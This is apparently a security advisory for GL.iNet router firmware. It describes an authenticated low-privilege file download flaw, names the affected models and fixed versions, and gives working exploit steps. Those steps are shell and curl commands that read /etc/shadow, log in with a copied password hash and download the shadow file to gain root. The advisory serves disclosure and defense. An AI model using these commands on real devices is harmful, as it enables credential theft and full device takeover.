# Unauthorized Access to File Download/Upload Interfaces
## Description
This vulnerability allows an unprivileged user who has authenticated to the GL management panel to download the contents of any file on the vulnerable system, including those owned by root. By downloading the shadow file and then using the encrypted password for root to log in to the management panel as root, this vulnerability can lead to remote code execution with root privileges.
## Affected Product
● MT6000 /MT3000 /MT2500 /AXT1800 /AX1800 /B3000 /A1300 /X300B /X3000 /XE3000 /X750 /SFT1200 /MT1300 /E750 /XE300 /AR750 /AR750S /AR300M /AR300M16 /B1300 /MT300N-V2
## Affected Firmware Version
● MT6000/MT3000/MT2500/AXT1800/AX1800: 4.6.2, fixed in 4.6.4
● B3000: 4.5.18, fixed in 4.5.19
● A1300/X300B: 4.5.17, fixed in 4.5.18
● X3000/XE3000: 4.4.9, fixed in 4.4.10
● X750/SFT1200/MT1300: 4.3.18, fixed in 4.3.19
● E750/XE300/AR750/AR750S/AR300M/AR300M16/B1300/MT300N-V2: 4.3.17, fixed in 4.3.18
## Exploit
1. Set the password for the FTP user account while simultaneously retrieving the FTP hash from the shadow file.
```
  passwd ftp

  grep ftp /etc/shadow
```
2. Authenticate to the GL's admin panel using curl and the FTP hash present in the shadow file.
```
  h=$(echo -n ftp:'$1$6BhUNBjq$gdIIpDaDDihj84O9qT5jH.':$(curl -s -k  -H 'Content-Type: application/json' -d '{"jsonrpc": "2.0", "id": 1, "method": "challenge", "params": {"username": "ftp"}}' 'https://192.168.8.1/rpc'|cut -d '"' -f18) |md5sum|cut -d' ' -f1) && curl -s -k -H 'Content-Type: application/json;charset=utf-8' -d '{"jsonrpc": "2.0", "id": 1, "method": "login", "params": {"username": "ftp", "hash":"'$h'"}}' 'https://192.168.8.1/rpc'
```
3. Verify on the target system that the new SID has no permissions at all, implying that the aclgroup value is unset or empty.
```
  ubus -v call gl-session status
```
4. Access to the /rpc URI is denied when using a non-privileged SID.
5. Successfully call the /download-URI using the same non-privileged SID.
```
  curl -k 'https://192.168.8.1/download' --data-binary  'sid=<SID>=/etc/shadow&filename=passwd\x0d\x0a'
```
## Impact
By exploiting this vulnerability, attackers can backdoor vulnerable systems or download sensitive files using a hidden root account. Furthermore, attackers can gain Remote Code Execution (RCE) with root privileges, giving them full control over the targeted device.
